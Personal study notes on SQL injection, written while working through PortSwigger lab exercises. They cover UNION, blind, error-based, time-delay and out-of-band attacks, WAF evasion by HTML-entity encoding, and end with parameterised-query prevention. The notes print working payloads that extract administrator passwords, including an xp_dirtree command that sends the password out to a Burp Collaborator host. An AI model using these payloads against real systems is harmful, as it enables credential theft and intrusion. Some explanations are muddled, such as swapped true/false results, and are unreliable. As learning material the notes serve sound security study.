Sql injection attacks;
  - it's an attack that attacker used to extract data of users inside the program and compromise the servers or the backend of the program 
  - it may be done using denial of service attack
  - as I said above it's impact as you know;
    - extract the data of the users like; passwords,credit cards...
how to detect sql injection
as you know  ; you need to test the software to see whehter it has a weaknesses or not
there are some tests you can submit into the application to see;  
  1. single quote '  and look for error
  2. some sql commands 
  3. boolean conditions like; OR 1=1 ..
Most cases that SQL  injections accours are;
1. in where statements
2. select statements
3. insert statements
4. Update statements


now we used SQL injection to extract; hidden data from the website
ex;
https://insecure-website.com/products?category=Gifts'--  -> here we added '-- 
-- -> is a comment in sql which means the restrication after that query make it comment and run this query instead 

this is the query behine the scene;
SELECT * FROM products
WHERE category = 'Gifts'--'
AND released = 1;
after you implement this query it will appear as you see;
SELECT * FROM products
WHERE category = 'Gifts'
no released restrication
ex'
https://insecure-website.com/products?category=Gifts' OR 1=1--

1=1 => true -> which means  choose any items from the table called products either it's categpry called Gifts or any one(true)
the query behined the scene;
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1; 

category = 'Gifts'
OR
1 = 1
for the first lab ; 
the problem ;
 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products



here are the solution;
https://0a3a00f5049a1016809fdfd600b000fd.web-security-academy.net/filter?category=Gifts%27+or+1=1--
I added '+or+1=1+-- 
this is the next test that you can add to make a sql injection into the lab 
note that ; '-- didn't show the whole items in the database so we used the other condition

----
2.Subverting application logic

by using query like this ; SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
you will notice that ; '--' => this comments will neglect all of what coming after it.
and just get the username with that name 
the solution of the lab on this;
 This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

the solution;
fill in the name with; administrator'--
then password with any num; 1233 
then click enter it will attack this website forward
---
Retrieving data from other tables:
  first you need to understand how union works in database;
SELECT City, Country FROM Customers
UNION
SELECT City, Country FROM Suppliers
ORDER BY City;
union remove all duplicates between rows + return compining data but without any duplication combine data vertically
return the same number of columns -> the tables to be compared have the same number of cclumns
+compatiple data types
This is called; SQL injection Union attack:
lab;
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

the soulution will be by adding this ; 'UNION SELECT NULL,NULL,NULL--    -> so the number of the tables are 3 as NULL is accepted 3 times and it's represent any datatype for our program to be matched with the opposite comparing of UNIION

to the response of the page .
notes; why adding  ' before writing injection 
      -> as we need to escape the string that program tried to cover it on our script so we escape this but if the program accept number so we don't need to add ' 
like;
if program need ; username='administrator' you passed to it ;  UNION SELECT NULL,NULL-- -> it will wrap around it a '' so it will be string so it's now can't be read by the database to work on

also we add -- to escape the trailing of the program 

---
# Blind SQL injection volunerabilities;
  - in this sql injection -> we ask database some questions yes,no => 
  - we extract data by asking database tons of questions
  - you may ask it like that ;
    select id  from users where id='1234444455...' 
      if the id exists -> database says ; like welcome to the website or whatever

now steps to do this attack;
  - select id from users where id='1233...' and  '1'='1';
    once the system says  somthing or open the website for you -> this means we can ask database any question
      is the admin pass start with a ...

  - you ask about the first character of the pass of the admin ;
    select id , substring(select pass from users where username='Admin',1,1)='a 
   from users and '1'='1'
      we need to extract the pass of admin character by other untill know it 
      if website open it's gate this means => a is correct else not try again 
      substring(string,1,1)=>1 -> the first character of the pass you ask for 
- also you may ask by ; is letter > "m" ?

so now ; what we will do ;
  - take the cookie of the you -> inject with it a statement like this 
select id from users where id=your cookie' and ' 1 '=' 1';
so to know the password of the user called administrator; we use blind sqlinjection attack
like this ;xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
if return true -> that means first char > m 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
if return false -> first character -> not >t
so it's located from m to t
now 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
if yes -> we know the first character is s 
repeat the process on all the coming characters.

lab ; 

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Hint

You can assume that the password only contains lowercase, alphanumeric characters.

analysis;
  - blind sql injection 
  - cookie for user
  - if query false -> no error appears , if yes -> pages says welcome back
  - database contain table=user
    - columns -> username,password
  - use blind sql to exploit and extract user password
  - log in as an administrator 
  - assume pass -> contain lowecase+alphanumeric chars.ddd
      go into repeater apply all of these payloads to see ;
      first ; make sure that there's a tables into the database so we use this ;
      TrackingId=edylXePlN1HEH7R9'and  (SELECT 'a' FROM users LIMIT 1)='a'--
      second make sure there is a column called + number of it's rows > 0 ; username 
      Cookie: TrackingId=edylXePlN1HEH7R9'and (SELECT count(*) from users where username='administrator')>0--
      now we want to inject our payload into the intruder to know the password;we know knows that 
      there's a table called; users+columns called; username,password we need to know the password
      so create a brute force attack to know the password;
        we need to know the password of the user first; 
          so we use this  attack ;
            TrackingId=edylXePlN1HEH7R9' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > §1§-- see whether the password bigger than the payload or not payload we change from 1;50 or whatever 
            fromhere we found that ; length of password =19 characters 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c1e1f513-4002-4ea4-b3d4-846c367eb2d5" />



      we will use this :
       ' and  SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--
 and set the first payload as number,second as bruteforce use the type of the attack ; cluster bomb as it works with two payloads
 
    now let's build our attack 
after 2 hours -> the password is   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
                                   s6c3nlsx945pip8jgz0
didn't open on my  lab as it takes many hours so maybe the streaming of application stop and the password change from the insside but I underdstand the concept


-------------------------
now let's see : second order sql injection;
  - you store your data legally then use this data to extract other users in the database
  - how to do this;
      insert into users  (user,pass) values ('nona','1234')
      then;
    SELECT * FROM users WHERE username = 'admin'--' now this return all users called admin whatever their password is.

    ----
    after you inject database now you can extract info about it like; version,list the tables of it.
    SELECT @@version  (to know mysql db)  or you can ; ' UNION SELECT @@version--  
    SELECT * FROM information_schema.tables
lab;
 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
Hint

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 

  analysis;
  - focus on product category filter
  - use Union attack to retrive result
  - solution= database version stirng

solution I clicked on buttons of category filter + then open that http in the repeater then run this query;
  ?category=Clothing%2c+shoes+and+accessories +(select Null,Null from dual)-- HTTP/2  it return 200 ok that means this table dual contain two columns now how to extract version of database;
  hit this instead of old query ;
?category=Clothing%2c+shoes+and+accessories' UNION SELECT BANNER ,NULL FROM V$VERSION--
note; Banner is a special column inside oracle that contain the version number + data about it.
output;
  CORE	11.2.0.2.0	Production

outputs;
  - once you knew the type of database+any table inside it => you started to wispeir around it by extracting it's version and soon.

--
lab;
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 
 analysis;
  - focus on product category filter
  - this lab used with mysql database
  - use Union attack to retrive result
  - solution= database version stirng
solution;
?category=Food+%26+Drink'+Union+select +@@version,+Null# HTTP/2
I added from Union untill Http.
note that  we use # as comment in database
    - @@version -> is a variable that used to return the version of the database.
output;
8.0.42-0ubuntu0.20.04.1
----
now we need to extract the table columns + table name so we use something called; information_schema which tells us about the information of the table
  - most database except oracle uses this;
    - to return the name of the tables inside this database;SELECT * FROM information_schema.tables
    - ex;SELECT * FROM information_schema.columns WHERE table_name = 'Users' this return info about table
   
      

lab;
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
Hint

You can find some useful payloads on our SQL injection cheat sheet(https://portswigger.net/web-security/sql-injection/cheat-sheet)
analysis;
  - sql injection in product filter
  - use UNION attack to retrieve data from other tables
  - table contain; usernames,passwords
  - determine the name of the table+ columns it contain->content of the tables (username,passwords)
  - log as administrator
  - non oracle database

solution;
  determine the type of database we use  ;
    - +Union+select+version(),+Null--     
    output;
    PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
    - we know this is postgresql + contain a table but we didn't know it's name but it's contents are password,username
      ' UNION SELECT table_name,NULL FROM information_schema.tables--
then we found name of the table at the  end of  it
'+Union select column_name,null from information_schema.columns where table_name='users_qthbul'
then ;
'union select table_name,Null from information_schema.tables-- 
column_column_usage
pg_user
tables
users_qsfhjx


'union select column_name,Null from information_schema.columns where table_name='users_qsfhjx'--
email
username_hnefnz
password_adbkwh
Union select username_hnefnz,password_adbkwh from users_qsfhjx--
for administrator;
password;zba54q160vgvq7n7ypja

# Listing the contents of an Oracle database lab;
rules; you can listen tables; SELECT * FROM all_tables
for columns;
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
lab; This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 
 Hint

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 

analysis;
  - sql injection in the product category filter.
  - extract the name of the table+columns in it-> to extract username,password
  - log in as administrator.
  - 
solution;
First define the number of columns inside dual table(built in table inside oracle)
note that we use : Dual as a test for our database by generating dummry data in single row or column

'Union select 'abc','cde' from dual--
from here we knew that we have 2 columns.
know let's start to extract table names
'union select table_name,Null from all_tables--
 	USERS_CXPIBK
 	DUAL
 	
 SELECT column_name,Null FROM all_tab_columns WHERE table_name = 'USERS_CXPIBK'
 	columns are,
 		USERNAME_ETLUHI
		PASSWORD_NKBJFC
		EMAIL
		
'union select USERNAME_ETLUHI,PASSWORD_NKBJFC from USERS_CXPIBK--
answer;

administrator		
yck9ysawofdkdwcibvtu
-------------
How to obfuscate(evade) ther filter to inject sql injection???

  - server,client systems are using methods for decoding incoming traffic they get from each other
  - if you want to inject -> define where you will inject first
  - also you may notice ; your query is decoded at the server side
  - while Html element that the client write decoded on the client side.
  - obfuscation via URl encoding;
    - any url is encoded through the browser before it's sent to the  server
      - ex; Fish & chips ->browser leaves Fish,chips as it is the only words that will be decoded are (space,&) why that as in other querys on the browser there are spaces.& -> so this may make interuption for the server when decode so browser encode it with &(ampersand)
      - space=%20
      - so you can inject URL encoded data => it will be interpreted by the server
      - you can inject into url by encode the words of payload you pass into familiar words that browser knows like %


-
How to obfuscute URL double in order to inject your payload?  
  -some servers have two roundes of decoding to avoid any injection thorugh it
  - know if you encode the payload two this will smuggle the server so  injection will be done
 - % will be encoded again into another payload like; %25 this will pass through waf(web app firewall)
- 


--
Obfuscation via Html encoding??
  - now we want to pass the injection payload throught the server using an HTML script-> just incode the word
  - also you can  avoid the blocking by the server by adding some zeros before the script you encoded.
  - <stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
as you see here we incode s from select just 

<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

lab;
 This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
 A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 
 analysis;
 	- sql injection in stock check feature
 	- result of query returned in application response
 	- use UNION attack to retrive data
 	- db contain users table
 	- users table -> contain usernames,passwords
 	- retrieve admin users credentials
 	- use Hackvertor to obfusecute the filter .
 	
 solution;	
 	UNION SELECT username FROM users
 I converted that query into decoded hex using cyberchef; &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
 then passed it into the html code in stock check 
 	
administrator
carlos
wiener
35 units

then I passed this to see the password;
 	UNION SELECT password FROM users
converted to html hex entities
&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
then this was the answer
sgm3efa7myeo1fiolmbc
l1jhqclppsp5tpzcsnu5
8gow8j7wyyv1gzsw83p1
35 units

from here we want administrator + it's pass is the first one let's pass in 
 	 
not solved yet as ther's a problem in the portswigger.


----
lab;
 Not solved

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data

analysis;
	- sql  injection in product category filter.
	- result returned in application response.
	- use UNION to retrieve data from other tables.
		- determine num of columns by the query




solution;
'UNION SELECT Null,'kzfzIC',Null--

---

 what is blind sql injection?
  - occur when the application is vulnerable + HTTP response doesn't contain on the results of relevent sql query   
  - union attack aren't efficient as it's relay on being able to see the injected query within the application process.
 
 
 how to use blind sql injection?
 	- if app uses traking id for each user 
 		like this Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
 	- in this case -> apps uses sql query to determine the user.
 		SELECT TrackingId FROM TrackedUsers WHERE TrackingId =      'u5YD3PapBcR4lN3e7Tj4' 
 
 from these two lines -> blind sql injection can be passed into this query
 
 to test that query use these two conditions;
 …xyz' AND '1'='1 => return false
…xyz' AND '1'='2 => return true
---
now using this id of the user you can exploit the password of that user ;
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't

lab; note I solved this lab before but the output of it didn't came true so I will solve it again to make sure where is the error ;
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

analysis;
	- blind sql injection 
	- application uses traking cookie
	- result of sql query aren't returned yet
	- database contain table->users
		username,password
	- exploit sql injection to find pass of user
	
pause for password for now;









Error-based SQL injection
	- you use error messages to extract sesitive data from db in blind context
	-you extract data using conditionals errors.
	
ex;
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

as you see -> first condition -> implies a as 1!=2
-> second condition -> implies 1/0 as 1=1 

xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

the same concept; now if the name != admi.. -> implies a else 1/0 error condition.


lab;

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

analysis;
	-blind sql injection
	-app uses traking cookies
	- app doesn't respond even if the query returns any rows
	- if the query causes an error -> app will return a custom error message.
	-db contain table-> users->username,password
	-exploit blind sql injection ->find password=>administrator.

 solution;
 pause for now.
 
 
 Extracting sensitive data via verbose SQL error messages;
 	- which means add some extra queries to extract the data from the database.
 Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char 
 this error may happened as you tried to enter a 3 quotes at a  time which is error 
 
 CAST((SELECT example_column FROM example_table) AS int)
 ERROR: invalid input syntax for type integer: "Example data"
 as you see;this generate an error  as you can't convert  the entries inside that column into int datatype.
 
 lab;
  This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 

analysis;
	- using traking cookie for analytics.
	- table-> users -> username,password 
	- leak the password for 'administrator'
	
solution;
'and cast(( select  1 )as  int)--;
this generate an  error says the returned value!=int
so to repair that
 'and 1=cast(( select  1 )as  int)--
 we  put the string that returned from backend as 1 to be equal to int
 now let's leak the password,username
 and 1=cast(( select username from users )as  int)--
 this generate an error 
 
 Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'E6Cf8xP0I2UpxKoJ'and 1=cast(( select username from users )as'. Expected  char
 
 now remove the string value of the traking id to free up some space to send the characters
 send again 
  TrackingId=' and 1=cast(( select username from users )as  int)--
 ERROR: more than one row returned by a subquery used as an expression
 now we know that backend retrun a values but it didn't match 1 so we need to limit our return values from db
: TrackingId='and 1=cast(( select username from users limit 1 )as  int)--
 output is an error 
 ERROR: invalid input syntax for type integer: "administrator"
 now change this value to be password 
 TrackingId='and 1=cast(( select password from users limit 1 )as  int)--
 
 output is an error contain this;nga4zl6lfl65rtr7dffh
 now register using password 
 
done. 
 
  ---
EXploiting blind sql injection by triggering time delays;
 
 we measure the behaviour of db by seeing the whether the sql will do delays in it or not ->  if it makes delays -> that means our injected idea are correct if  no -> our injecting query is false.
 
 '; IF (1=2) WAITFOR DELAY '0:0:10'--  
'; IF (1=1) WAITFOR DELAY '0:0:10'--
 
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
as you see this is used to delay a  query from executation in order to avoide the 
lab;
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
 analysis;
 	- focus on traking cookie 
 	- result of sql query arn't returned
 	- app doesn't respond whether the query return (rows|error)
 	- possible to trigger conditional time delays.
 	
solution
' || pg_sleep(10)--
this will pause the database for  10 seconds (solution) why we used pg_sleep(10) -> that means that we inside postgresql as it works
if  you hacked another thing -> you   just see how to sleep it with different database commands untill you see the output is paused.
 
 
 Exploiting blind SQL injection using out-of-band (OAST) techniques
	- app in this type -> do sql query asynchronously
	- traking cookie is still vulnerable
	- none of (error sql or delay sql,..) will work.

	- exploit db by using;
		- triggering out of band 
		- DNS protocol 
		- the easiest way for out of band is collabrotor.
		-to trigger the DNS use this query;
			-'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
			
use this to exfiltate data from vulnerable app;
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
out of band the most effective way to find a vulnerability through the db.

	untill now ; we need to download other band(to get the output of the database we need to vulnerable this band is done using DNS server)
	~/go/bin/interactsh-client -v -o interactsh-log.txt  tomorrow you need to start with this command + start OAST sql injection lab inshallah

	
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
analysis;
	- blind sql injection vulnerability
	- traking cookie
	- out-of-band with external domain
	- table=> users->columns username,password
	- use the blind sql to exploit the pass of administrator.
	- to solve ->pass with administrator user
	































how to prevent Sql injection?
 you need to change query from using variable as input into
 using hardcoded constant that takes variable from another function to prevent access this variable through the query that control the database.
 ex;
 String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
as you see; input is passed into the clause of query -> this is dangerous we can pass into it Null from outside and pass all database.
to avoid this problem use pramatarized queries ;
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();  

   







 
